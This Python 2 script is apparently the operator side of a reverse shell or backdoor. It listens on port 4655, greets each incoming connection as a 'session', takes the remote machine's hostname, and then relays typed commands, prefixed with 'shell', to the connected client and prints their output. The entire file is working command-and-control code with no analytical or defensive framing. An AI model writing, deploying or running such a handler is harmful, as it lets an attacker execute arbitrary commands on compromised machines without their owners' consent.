import socket,sys

class SocketServer():
    def __init__(self, port = "4655", start = True):
        self.host = ''

        #assign port, default port will be the specified input parameter
        self.port = int(port)

        #if start = true, start up the connection directly
        if start == True:
            self.socketCreate()
            self.socketBind()
            self.socketAccept()
    def socketCreate(self):
        try:
            self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error, e:
            print 'Socket creation error: ' + str(e.message)
    def socketBind(self):
        try:
            print 'Binding socket at port %s' % (self.port)
            self.s.bind((self.host, self.port))
            self.s.listen(1)
        except socket.error, e:
            print 'Socket binding error: ' + str(e.message)
            print 'Retrying...'
            self.socketBind()
    def socketAccept(self):
        try:
            self.conn, self.addr = self.s.accept()
            print '[!] Session opened at %s:%s' % (self.addr[0], self.addr[1]);
            print '\n'
            #will assign variable hostname to the hostname of remote client
            self.hostname = self.conn.recv(1024)
            self.menu()
        except socket.error, e:
            print 'Socket Acception error: ' + str(e.message)
    def menu(self):
        while True:
            cmd = raw_input(str(self.addr[0])+"@"+str(self.hostname) + '> ')
            if cmd == 'quit':
                self.conn.send(cmd)
                self.conn.close()
                self.s.close()
                sys.exit()
            command = self.conn.send("shell"+cmd)
            result = self.conn.recv(16834)
            if result != self.hostname:
                print result


socketServer = SocketServer()

